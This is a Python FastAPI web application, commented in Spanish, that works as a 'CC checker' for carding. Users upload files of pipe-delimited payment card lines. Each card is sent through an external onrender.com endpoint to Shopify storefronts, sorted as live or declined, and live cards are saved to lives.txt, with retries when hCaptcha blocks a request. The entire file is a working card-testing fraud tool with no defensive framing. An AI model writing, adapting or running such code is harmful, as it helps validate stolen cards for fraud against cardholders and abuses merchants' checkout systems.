from fastapi import FastAPI, WebSocket, UploadFile, File
from fastapi.responses import HTMLResponse
import random
import requests
import os

app = FastAPI(title="CC Checker Web")

# --- Cargar sitios ---
if not os.path.exists("sites.txt"):
    sites = ["https://paperbloom.com"]
else:
    with open("sites.txt", "r") as f:
        sites = [line.strip() for line in f if line.strip()]

# --- Función para chequear CC ---
def check_cc(cc_line, site):
    url = f"https://auto-shopify-6cz4.onrender.com/index.php?site={site}&cc={cc_line}"
    try:
        r = requests.get(url, timeout=20)
        if r.status_code != 200:
            return {"cc": cc_line, "status": f"HTTP_ERROR_{r.status_code}", "site": site}

        try:
            data = r.json()
        except:
            return {"cc": cc_line, "status": "INVALID_RESPONSE", "site": site}

        response = data.get("Response", "").upper()
        if "CARD_DECLINED" in response or "DEAD" in response:
            return {"cc": cc_line, "status": "DECLINED", "site": site}
        elif "LIVE" in response:
            with open("lives.txt", "a") as f:
                f.write(cc_line + "\n")
            return {"cc": cc_line, "status": "LIVE", "site": site}
        elif "HCAPTCHA" in response or "GENERIC_ERROR" in response or "CONNECTION_ABORTED" in response:
            return {"cc": cc_line, "status": response, "site": site, "retry": True}
        else:
            return {"cc": cc_line, "status": response, "site": site}
    except Exception as e:
        return {"cc": cc_line, "status": "ERROR", "message": str(e), "site": site, "retry": True}

# --- Página web ---
@app.get("/", response_class=HTMLResponse)
def index():
    return """
    <html>
        <head>
            <title>CC Checker en tiempo real</title>
            <style>
                body { font-family: Arial; margin: 20px; }
                #stats { margin-bottom: 20px; }
                li.live { color: green; }
                li.declined { color: red; }
                li.error { color: orange; }
            </style>
        </head>
        <body>
            <h2>Subir archivo ccs.txt</h2>
            <form id="uploadForm" enctype="multipart/form-data">
                <input name="file" type="file" accept=".txt">
                <button type="submit">Procesar CCs</button>
            </form>

            <div id="stats">
                <p>Total procesadas: <span id="total">0</span></p>
                <p>LIVE: <span id="live">0</span></p>
                <p>DECLINADAS: <span id="declined">0</span></p>
                <p>ERRORES: <span id="error">0</span></p>
                <p>Progreso: <span id="progress">0%</span></p>
            </div>

            <ul id="results"></ul>

            <script>
                const form = document.getElementById('uploadForm');
                const results = document.getElementById('results');
                const totalSpan = document.getElementById('total');
                const liveSpan = document.getElementById('live');
                const declinedSpan = document.getElementById('declined');
                const errorSpan = document.getElementById('error');
                const progressSpan = document.getElementById('progress');

                form.onsubmit = async (e) => {
                    e.preventDefault();
                    const fileInput = form.querySelector('input[name="file"]');
                    if (!fileInput.files.length) return alert("Sube un archivo .txt");
                    
                    const file = fileInput.files[0];
                    const reader = new FileReader();
                    reader.onload = () => {
                        const lines = reader.result.split("\\n").filter(l => l.includes("|"));
                        let total = lines.length;
                        let count = 0;
                        let liveCount = 0, declinedCount = 0, errorCount = 0;

                        const ws = new WebSocket(`ws://${location.host}/ws`);
                        ws.onopen = () => ws.send(reader.result);

                        ws.onmessage = (event) => {
                            const data = JSON.parse(event.data);
                            const li = document.createElement("li");
                            li.textContent = `${data.cc} - ${data.status} - ${data.site}`;
                            if (data.status === "LIVE") li.className = "live";
                            else if (data.status === "DECLINED") li.className = "declined";
                            else li.className = "error";
                            results.appendChild(li);

                            count++;
                            totalSpan.textContent = count;
                            if (data.status === "LIVE") liveCount++;
                            else if (data.status === "DECLINED") declinedCount++;
                            else errorCount++;
                            liveSpan.textContent = liveCount;
                            declinedSpan.textContent = declinedCount;
                            errorSpan.textContent = errorCount;
                            progressSpan.textContent = Math.floor((count/total)*100) + "%";
                        };
                    };
                    reader.readAsText(file);
                }
            </script>
        </body>
    </html>
    """

# --- WebSocket ---
@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    await websocket.accept()
    content = await websocket.receive_text()   # contenido del archivo
    lines = [line.strip() for line in content.splitlines() if "|" in line]

    for cc_line in lines:
        available_sites = sites.copy()
        random.shuffle(available_sites)
        processed = False
        for site in available_sites:
            result = check_cc(cc_line, site)
            if result.get("retry", False):
                continue
            await websocket.send_text(str(result).replace("'", '"'))
            processed = True
            break
        if not processed:
            await websocket.send_text(str({"cc": cc_line, "status": "NO_PROCESADO", "site": "Todos"}).replace("'", '"'))

    await websocket.close()
